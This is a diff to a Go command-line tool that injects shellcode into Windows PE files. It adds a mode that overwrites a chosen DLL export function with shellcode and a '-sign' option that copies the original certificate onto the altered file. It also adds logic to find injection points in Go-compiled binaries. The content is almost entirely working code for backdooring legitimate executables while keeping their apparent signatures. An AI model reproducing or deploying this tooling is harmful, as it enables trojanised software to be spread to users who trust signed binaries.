@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"encoding/binary"
 	"flag"
 	"fmt"
@@ -46,6 +47,7 @@ func GetFileAttributes(filename string) (uint32, error) {
 func main() {
 	if len(os.Args) < 4 {
 		fmt.Println("Usage: program [-sign] function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
+		fmt.Println("Usage: program [-sign] EAT <modify_pe_file_path> <shellcode_or_pe_path> <function name>")
 		return
 	}
 
@@ -58,7 +60,8 @@ func main() {
 	// 获取非flag参数
 	args := flag.Args()
 	if len(args) < 3 {
-		fmt.Println("Usage: program function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path> [-sign]")
+		fmt.Println("Usage: program [-sign] function/entrypoint/tlsinject <modify_pe_file_path> <shellcode_or_pe_path>")
+		fmt.Println("Usage: program [-sign] EAT <modify_pe_file_path> <shellcode_or_pe_path> <function name>")
 		return
 	}
 
@@ -132,6 +135,23 @@ func main() {
 			clearcert(modify)
 			patchTls(modify, textpath)
 		}
+	case "EAT":
+		funcname := args[3]
+		if *sign {
+			fmt.Println("getsign")
+			cert = CopyCert(modify)
+			err0 := EATpatch(modify, funcname, textpath)
+			if err0 != nil {
+				panic(err0)
+			}
+			WriteCert(cert, modify, modify)
+		} else {
+			err0 := EATpatch(modify, funcname, textpath)
+			if err0 != nil {
+				panic(err0)
+			}
+			clearcert(modify)
+		}
 	default:
 		fmt.Println("wrong mode")
 	}
@@ -146,6 +166,94 @@ func main() {
 		fmt.Println("Attributes set back to 'ar'")
 	}
 
+}
+
+// EATpatch 对 DLL 的指定导出函数进行文件 patch，写入 shellcode
+func EATpatch(pePath, funcname, shellcodePath string) error {
+	// 打开 PE 文件
+	file, err := pe.Open(pePath)
+	if err != nil {
+		return fmt.Errorf("Error opening PE file: %v", err)
+	}
+	defer file.Close()
+
+	// 获取 EAT
+	eat, err := file.Exports()
+	if err != nil {
+		return fmt.Errorf("Error get EAT: %v", err)
+	}
+
+	var funcAddr uint32
+	for _, func0 := range eat {
+		if strings.EqualFold(func0.Name, funcname) {
+			fmt.Printf("Get func %s addr 0x%x\n", funcname, func0.VirtualAddress)
+			funcAddr = func0.VirtualAddress
+			break
+		}
+	}
+
+	if funcAddr == 0 {
+		return fmt.Errorf("Function address not found")
+	}
+
+	// 计算文件偏移
+	funcOff := rva2offset(file, funcAddr)
+	if err != nil {
+		return fmt.Errorf("Error calculating file offset: %v", err)
+	}
+
+	fmt.Printf("Function Offset: 0x%x\n", funcOff)
+
+	// 读取 shellcode
+	shellcode, err := ioutil.ReadFile(shellcodePath)
+	if err != nil {
+		return fmt.Errorf("无法读取shellcode文件: %v", err)
+	}
+
+	fmt.Printf("Shellcode length: %d\n", len(shellcode))
+
+	// 打开文件进行写入
+	file0, err := os.OpenFile(pePath, os.O_RDWR, 0644)
+	if err != nil {
+		return fmt.Errorf("无法打开PE文件: %v", err)
+	}
+	defer file0.Close()
+
+	// 将文件指针移动到函数偏移位置
+	if _, err := file0.Seek(int64(funcOff), 0); err != nil {
+		return fmt.Errorf("无法定位到文件偏移: %v", err)
+	}
+
+	// 读取从 funcOff 开始的代码
+	originalCode := make([]byte, len(shellcode)+2) // +2 是为了读取到足够的字节进行判断
+	if _, err := file0.Read(originalCode); err != nil {
+		return fmt.Errorf("无法读取原始代码: %v", err)
+	}
+
+	// 遍历 originalCode，从 funcOff 位置开始，判断是否符合条件
+	for i := 0; i <= len(originalCode)-2; i++ {
+		if originalCode[i] == 0xC3 { // ret opcode
+			interval := i
+			if interval < len(shellcode) {
+				return fmt.Errorf("间隔小于shellcode大小，无法写入")
+			}
+			break
+		}
+	}
+
+	// 将文件指针重新移动到函数偏移位置
+	if _, err := file0.Seek(int64(funcOff), 0); err != nil {
+		return fmt.Errorf("无法定位到文件偏移: %v", err)
+	}
+
+	// 写入 shellcode
+	if _, err := file0.Write(shellcode); err != nil {
+		return fmt.Errorf("无法写入数据: %v", err)
+	}
+
+	fmt.Println("成功: shellcode已成功写入PE文件中。")
+
+	return nil
 }
 
 type IMAGE_DOS_HEADER struct {
@@ -596,7 +704,66 @@ func findCrtFunction(pePath string, dataLen int) uint64 {
 			}
 		}
 	}
+
+	isGo, _ := isGoPEFile(peFile)
+	if isGo {
+		fmt.Println("Go PE File!!")
+		return findByCrtGO(pePath, crtAddr, dataLen)
+	}
+
 	return findByCrt(pePath, crtAddr, dataLen)
+}
+
+// 检查 PE 文件是否是由 Go 编译器生成的
+func isGoPEFile(peFile *pe.File) (bool, error) {
+	for _, section := range peFile.Sections {
+		if section.Name == ".rdata" {
+			data, err := section.Data()
+			if err != nil {
+				return false, fmt.Errorf("无法读取节数据: %v", err)
+			}
+			if bytes.Contains(data, []byte("go build")) {
+				return true, nil
+			}
+		}
+	}
+	return false, nil
+}
+
+func findByCrtGO(pePath string, crtAddr uint64, dataLen int) uint64 {
+	peFile, err := pe.Open(pePath)
+	if err != nil {
+		fmt.Println("无法读取PE文件:", err)
+		return 0
+	}
+	defer peFile.Close()
+
+	crtAddrRva := va2rva(peFile, crtAddr)
+	codeSize := uint32(0x300)
+	codeRva := crtAddrRva
+	codeVa := uint64(codeRva) + peFile.OptionalHeader.(*pe.OptionalHeader64).ImageBase
+	code, err := getMemoryMappedImage(peFile)
+	if err != nil {
+		fmt.Println("无法获取内存映射镜像:", err)
+		return 0
+	}
+
+	code = code[codeRva : codeRva+codeSize]
+
+	var crtR8Addr uint64
+	crtR8AddrCount := 0
+	for i := 0; i < len(code)-5; i++ {
+		if code[i] == 0xE9 { // jmp opcode
+			crtR8AddrCount++
+			if crtR8AddrCount == 1 {
+				relativeAddr := int32(binary.LittleEndian.Uint32(code[i+1 : i+5]))
+				crtR8Addr = uint64(int64(codeVa) + int64(i) + int64(relativeAddr) + 5)
+				fmt.Printf("abi0 function VA: 0x%x\n", crtR8Addr)
+				break
+			}
+		}
+	}
+	return findByMain(pePath, crtR8Addr, dataLen)
 }
 
 func findByCrt(pePath string, crtAddr uint64, dataLen int) uint64 {
@@ -895,7 +1062,7 @@ func WriteCert(cert []byte, path string, outputPath string) {
 func clearcert(path string) {
 	CertTableLOC, CertLOC, CertSize := GetPeInfo(path)
 	if CertSize == 0 || CertLOC == 0 {
-		fmt.Println("[*] Input file Not signed! ")
+		//fmt.Println("[*] Input file Not signed! ")
 		return
 	}
 
